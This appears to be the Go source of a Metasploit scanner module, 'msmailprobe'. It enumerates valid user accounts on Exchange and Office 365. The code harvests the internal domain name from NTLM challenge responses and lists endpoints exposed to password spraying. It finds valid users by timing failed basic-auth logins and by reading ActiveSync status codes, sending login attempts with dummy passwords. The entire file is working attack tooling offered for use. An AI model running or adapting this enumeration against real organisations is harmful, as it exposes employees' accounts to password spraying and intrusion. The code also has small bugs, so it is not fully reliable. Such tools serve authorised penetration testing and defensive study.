//usr/bin/env go run "$0" "$@"; exit "$?"

/*
 OWA (Outlook Webapp) is vulnerable to time-based user enumeration attacks.
 This module leverages all known, and even some lesser-known services exposed by default
 Exchange installations to enumerate users. It also targets Office 365 for error-based user enumeration.

 Identify Command

    Used for gathering information about a host that may be pointed towards an Exchange or o365 tied domain
    Queries for specific DNS records related to Office 365 integration
    Attempts to extract internal domain name for onprem instance of Exchange
    Identifies services vulnerable to time-based user enumeration for onprem Exchange
    Lists password-sprayable services exposed for onprem Exchange host

 Userenum (o365) Command

    Error-based user enumeration for Office 365 integrated email addresses

 */
package main

import (
	"crypto/tls"
	b64 "encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"metasploit/module"
	"net"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
	"strconv"
)

func main() {
	metadata := &module.Metadata{
		Name:        "msmailprobe",
		Description: "Office 365 and Exchange Enumeration",
		Authors:     []string{"poptart", "jlarose", "Vincent Yui", "grimhacker", "Nate Power", "Nick Powers", "clee-r7"},
		Date:        "2018-11-6",
		Type:        "single_scanner",
		Privileged:  false,
		References:  []module.Reference{},
		Options: map[string]module.Option{
			"Command":          {Type: "string", Description: "Either 'userenum' or 'identify'", Required: true, Default: "identify"},
			"OnPrem":           {Type: "bool", Description: "Flag to specify an On-Premise instance of Exchange", Required: false, Default: "false"},
			"O365":             {Type: "bool", Description: "Use this flag if Exchange services are hosted by Office 365", Required: false, Default: "false"},
			"UserName":         {Type: "string", Description: "Single user name to do identity test against", Required: false, Default: ""},
			"UserNameFilePath": {Type: "string", Description: "Path to file containing list of users", Required: false, Default: ""},
			"Email":            {Type: "string", Description: "Single email address to do identity test against", Required: false, Default: ""},
			"EmailFilePath":    {Type: "string", Description: "Path to file containing list of email addresses", Required: false, Default: ""},
			"OutputFile":       {Type: "string", Description: "Used for outputting valid users/email", Required: false, Default: ""},
	}}

	module.Init(metadata, run)
}

func run(params map[string]interface{}) {
	switch strings.ToLower(params["Command"].(string)) {
	case "userenum":
		doUserEnum(params)
	case "identify":
		doIdentify(params)
	default:
		module.LogError("Command should be set and must be either: 'userenum' or 'identify'")
	}
}

func doUserEnum(params map[string]interface{}) {
	onPrem, e := strconv.ParseBool(params["OnPrem"].(string))
	if e != nil {
		module.LogError("Unable to parse 'OnPrem' value: " + e.Error())
		return
	}

	o365, e := strconv.ParseBool(params["O365"].(string))
	if e != nil {
		module.LogError("Unable to parse 'O365' value: " + e.Error())
		return
	}

	if !onPrem && !o365 {
		module.LogError("Either 'OnPrem' or 'O365' needs to be set")
		return
	}

	if onPrem && o365 {
		module.LogError("Both 'OnPrem' and 'O365' cannot be set")
		return
	}

	threads, e := strconv.Atoi(params["THREADS"].(string))
	if e != nil {
		module.LogError("Unable to parse 'Threads' value using default (5)")
		threads = 5
	}

	if threads > 100 {
		module.LogInfo("Threads value too large, setting max(100)")
		threads = 100
	}

	if onPrem {
		runOnPrem(params, threads)
	} else {
		runO365(params, threads)
	}
}

func doIdentify(params map[string]interface{}) {
	host := params["RHOSTS"].(string)
	harvestInternalDomain(host, true)
	urlEnum(host)
}

func runOnPrem(params map[string]interface{}, threads int) {
	// The core shim prevents an empty RHOSTS value - we should fix this.
	userNameFilePath := params["UserNameFilePath"].(string)
	userName := params["UserName"].(string)
	outputFile := params["OutputFile"].(string)
	host := params["RHOSTS"].(string)

	if userNameFilePath == "" && userName == "" {
		module.LogError("Expected 'UserNameFilePath' or 'UserName' field to be populated")
		return
	}

	if userNameFilePath != "" {
		avgResponse := basicAuthAvgTime(host)
		if outputFile == "" {
			determineValidUsers(host, avgResponse, importUserList(userNameFilePath), threads)
		} else {
			writeFile(outputFile, determineValidUsers(host, avgResponse, importUserList(userNameFilePath), threads))
		}
	} else {
		avgResponse := basicAuthAvgTime(host)
		determineValidUsers(host, avgResponse, []string{userName}, threads)
	}
}

func runO365(params map[string]interface{}, threads int) {
	email := params["Email"].(string)
	emailFilePath := params["EmailFilePath"].(string)
	outputFile := params["OutputFile"].(string)

	if email == "" && emailFilePath == "" {
		module.LogError("Expected 'Email' or 'EmailFilePath' field to be populated")
		return
	}

	if outputFile == "" {
		if email != "" {
			o365enum([]string{email}, threads)
		}

		if emailFilePath != "" {
			o365enum(importUserList(emailFilePath), threads)
		}
	} else {
		if email != "" {
			writeFile(outputFile, o365enum([]string{email}, threads))
		}

		if emailFilePath != "" {
			writeFile(outputFile, o365enum(importUserList(emailFilePath), threads))
		}
	}
}

func harvestInternalDomain(host string, outputDomain bool) string {
	if outputDomain == true {
		module.LogInfo("Attempting to harvest internal domain:")
	}
	url1 := "https://" + host + "/ews"
	url2 := "https://" + host + "/autodiscover/autodiscover.xml"
	url3 := "https://" + host + "/rpc"
	url4 := "https://" + host + "/mapi"
	url5 := "https://" + host + "/oab"
	url6 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if webRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if webRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if webRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else if webRequestCodeResponse(url4) == 401 {
		urlToHarvest = url4
	} else if webRequestCodeResponse(url5) == 401 {
		urlToHarvest = url5
	} else if webRequestCodeResponse(url6) == 401 {
		urlToHarvest = url6
	} else {
		module.LogInfo("Unable to resolve host provided to harvest internal domain name.\n")
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	timeout := time.Duration(3 * time.Second)

	client := &http.Client{
		Timeout:   timeout,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", urlToHarvest, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36")
	req.Header.Set("Authorization", "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	ntlmResponse := resp.Header.Get("WWW-Authenticate")
	data := strings.Split(ntlmResponse, " ")
	base64DecodedResp, err := b64.StdEncoding.DecodeString(data[1])
	if err != nil {
		module.LogError("Unable to parse NTLM response for internal domain name")
	}

	var continueAppending bool
	var internalDomainDecimal []byte
	for _, decimalValue := range base64DecodedResp {
		if decimalValue == 0 {
			continue
		}
		if decimalValue == 2 {
			continueAppending = false
		}
		if continueAppending == true {
			internalDomainDecimal = append(internalDomainDecimal, decimalValue)
		}
		if decimalValue == 15 {
			continueAppending = true
			continue
		}
	}
	if outputDomain == true {
		module.LogInfo("Internal Domain: ")
		module.LogInfo(string(internalDomainDecimal))
	}
	return string(internalDomainDecimal)
}

func importUserList(tempname string) []string {
	userFileBytes, err := ioutil.ReadFile(tempname)
	if err != nil {
		module.LogError(err.Error())
	}
	var userFileString = string(userFileBytes)
	userArray := strings.Split(userFileString, "\n")
	//Delete last unnecessary newline inserted into this slice
	userArray = userArray[:len(userArray)-1]
	return userArray
}

func determineValidUsers(host string, avgResponse time.Duration, userlist []string, threads int) []string {
	limit := threads
	var wg sync.WaitGroup
	mux := &sync.Mutex{}
	queue := make(chan string)

	/*Keep in mind you, nothing has been added to handle successful auths
	  so the password for auth attempts has been hardcoded to something
	  that is not likely to be correct.
	*/
	pass := "Summer2018978"
	internaldomain := harvestInternalDomain(host, false)
	url1 := "https://" + host + "/autodiscover/autodiscover.xml"
	url2 := "https://" + host + "/Microsoft-Server-ActiveSync"
	url3 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if webRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if webRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if webRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else {
		module.LogInfo("Unable to resolve host provided to determine valid users.")
		return []string{}
	}
	var validusers []string
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	for i := 0; i < limit; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for user := range queue {
				startTime := time.Now()
				webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+user, pass, tr)
				elapsedTime := time.Since(startTime)

				if float64(elapsedTime) < float64(avgResponse)*0.77 {
					mux.Lock()
					module.LogInfo("[+] " + user + " - " + string(elapsedTime))
					validusers = append(validusers, user)
					mux.Unlock()
				} else {
					mux.Lock()
					module.LogInfo("[-] " + user + " - " + string(elapsedTime))
					mux.Unlock()
				}
			}
		}(i)
	}

	for i := 0; i < len(userlist); i++ {
		queue <- userlist[i]
	}

	close(queue)
	wg.Wait()
	return validusers
}

func basicAuthAvgTime(host string) time.Duration {
	internaldomain := harvestInternalDomain(host, false)
	url1 := "https://" + host + "/autodiscover/autodiscover.xml"
	url2 := "https://" + host + "/Microsoft-Server-ActiveSync"
	url3 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if webRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if webRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if webRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else {
		module.LogInfo("Unable to resolve host provided to determine valid users.")
		return -1
	}

	//We are determining sample auth response time for invalid users, the password used is irrelevant.
	pass := "Summer201823904"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	module.LogInfo("Collecting sample auth times...")

	var sliceOfTimes []float64
	var medianTime float64

	usernamelist := []string{"sdfsdskljdfhkljhf", "ssdlfkjhgkjhdfsdfw", "sdfsdfdsfff", "sefsefsefsss", "lkjhlkjhiuyoiuy", "khiuoiuhohuio", "s2222dfs45g45gdf", "sdfseddf3333"}
	for i := 0; i < len(usernamelist)-1; i++ {
		startTime := time.Now()
		webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+usernamelist[i], pass, tr)
		elapsedTime := time.Since(startTime)
		if elapsedTime > time.Second*15 {
			module.LogInfo("Response taking longer than 15 seconds, setting time:")
			module.LogInfo("Avg Response: " + string(time.Duration(elapsedTime)))
			return time.Duration(elapsedTime)
		}
		if i != 0 {
			module.LogInfo(elapsedTime.String())
			sliceOfTimes = append(sliceOfTimes, float64(elapsedTime))
		}
	}
	sort.Float64s(sliceOfTimes)
	if len(sliceOfTimes)%2 == 0 {
		positionOne := len(sliceOfTimes)/2 - 1
		positionTwo := len(sliceOfTimes) / 2
		medianTime = (sliceOfTimes[positionTwo] + sliceOfTimes[positionOne]) / 2
	} else if len(sliceOfTimes)%2 != 0 {
		position := len(sliceOfTimes)/2 - 1
		medianTime = sliceOfTimes[position]
	} else {
		module.LogError("Error determining whether length of times gathered is even or odd to obtain median value.")
	}
	module.LogInfo("Avg Response: " + string(time.Duration(medianTime)))
	return time.Duration(medianTime)
}

func o365enum(emaillist []string, threads int) []string {
	limit := threads
	var wg sync.WaitGroup
	mux := &sync.Mutex{}
	queue := make(chan string)
	//limit := 100

	/*Keep in mind you, nothing has been added to handle successful auths
	  so the password for auth attempts has been hardcoded to something
	  that is not likely to be correct.
	*/
	pass := "Summer2018876"
	URI := "https://outlook.office365.com/Microsoft-Server-ActiveSync"
	var validemails []string

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	for i := 0; i < limit; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for email := range queue {
				responseCode := webRequestBasicAuth(URI, email, pass, tr)
				if strings.Contains(email, "@") && responseCode == 401 {
					mux.Lock()
					module.LogInfo("[+]  " + email + " - 401")
					validemails = append(validemails, email)
					mux.Unlock()
				} else if strings.Contains(email, "@") && responseCode == 404 {
					mux.Lock()
					module.LogInfo(fmt.Sprintf("[-]  %s - %d \n", email, responseCode))
					mux.Unlock()
				} else {
					mux.Lock()
					module.LogInfo(fmt.Sprintf("Unusual Response: %s - %d \n", email, responseCode))
					mux.Unlock()
				}
			}
		}(i)
	}

	for i := 0; i < len(emaillist); i++ {
		queue <- emaillist[i]
	}

	close(queue)
	wg.Wait()
	return validemails
}

func webRequestBasicAuth(URI string, user string, pass string, tr *http.Transport) int {
	timeout := time.Duration(45 * time.Second)
	client := &http.Client{
		Timeout:   timeout,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", URI, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1")
	req.SetBasicAuth(user, pass)
	resp, err := client.Do(req)
	if err != nil {
		module.LogInfo(fmt.Sprintf("Potential Timeout - %s \n", user))
		module.LogInfo("One of your requests has taken longer than 45 seconds to respond.")
		module.LogInfo("Consider lowering amount of threads used for enumeration.")
		module.LogError(err.Error())
	}
	return resp.StatusCode
}

func urlEnum(hostInput string) {
	hostSlice := strings.Split(hostInput, ".")
	o365Domain := hostSlice[len(hostSlice)-2] + "-" + hostSlice[len(hostSlice)-1] + ".mail.protection.outlook.com"
	addr, err := net.LookupIP(o365Domain)
	if err != nil {
		module.LogInfo("Domain is not using o365 resources.")
	} else if addr == nil {
		module.LogError("error")
	} else {
		module.LogInfo("Domain is using o365 resources.")
	}
	asURI := "https://" + hostInput + "/Microsoft-Server-ActiveSync"
	adURI := "https://" + hostInput + "/autodiscover/autodiscover.xml"
	ad2URI := "https://autodiscover." + hostInput + "/autodiscover/autodiscover.xml"
	owaURI := "https://" + hostInput + "/owa"
	timeEndpointsIdentified := false
	module.LogInfo("Identifying endpoints vulnerable to time-based enumeration:")
	timeEndpoints := []string{asURI, adURI, ad2URI, owaURI}
	for _, uri := range timeEndpoints {
		responseCode := webRequestCodeResponse(uri)
		if responseCode == 401 {
			module.LogInfo("[+] " + uri)
			timeEndpointsIdentified = true
		}
		if responseCode == 200 {
			module.LogInfo("[+] " + uri)
			timeEndpointsIdentified = true
		}
	}
	if timeEndpointsIdentified == false {
		module.LogInfo("No Exchange endpoints vulnerable to time-based enumeration discovered.")
	}
	module.LogInfo("Identifying exposed Exchange endpoints for potential spraying:")
	passEndpointIdentified := false
	rpcURI := "https://" + hostInput + "/rpc"
	oabURI := "https://" + hostInput + "/oab"
	ewsURI := "https://" + hostInput + "/ews"
	mapiURI := "https://" + hostInput + "/mapi"

	passEndpoints401 := []string{oabURI, ewsURI, mapiURI, asURI, adURI, ad2URI, rpcURI}
	for _, uri := range passEndpoints401 {
		responseCode := webRequestCodeResponse(uri)
		if responseCode == 401 {
			module.LogInfo("[+] " + uri)
			passEndpointIdentified = true
		}
	}
	ecpURI := "https://" + hostInput + "/ecp"
	endpoints200 := []string{ecpURI, owaURI}
	for _, uri := range endpoints200 {
		responseCode := webRequestCodeResponse(uri)
		if responseCode == 200 {
			module.LogInfo("[+] " + uri)
			passEndpointIdentified = true
		}
	}
	if passEndpointIdentified == false {
		module.LogInfo("No onprem Exchange services identified.")
	}
}

func webRequestCodeResponse(URI string) int {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	timeout := time.Duration(3 * time.Second)
	client := &http.Client{
		Timeout:   timeout,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", URI, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1")
	resp, err := client.Do(req)
	if err != nil {
		return 0
		//log.Fatal(err)
	}
	return resp.StatusCode
}

func writeFile(filename string, values []string) {
	if len(values) == 0 {
		return
	}
	f, err := os.Create(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	for _, value := range values {
		fmt.Fprintln(f, value)
	}
}
